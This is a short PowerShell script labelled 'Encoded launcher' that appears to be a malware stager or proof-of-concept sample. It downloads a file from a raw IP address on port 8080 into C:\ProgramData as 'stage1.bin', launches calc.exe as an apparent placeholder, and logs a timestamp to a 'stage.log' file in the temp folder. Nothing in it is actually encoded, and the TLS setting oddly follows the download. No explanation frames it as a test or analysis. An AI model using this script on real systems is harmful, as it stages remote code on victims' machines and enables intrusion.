# Encoded launcher
$TargetUrl = "http://198.51.100.139:8080/assets/update.dat"
$PayloadPath = "C:\ProgramData\stage1.bin"
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $PayloadPath)
& "calc.exe"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
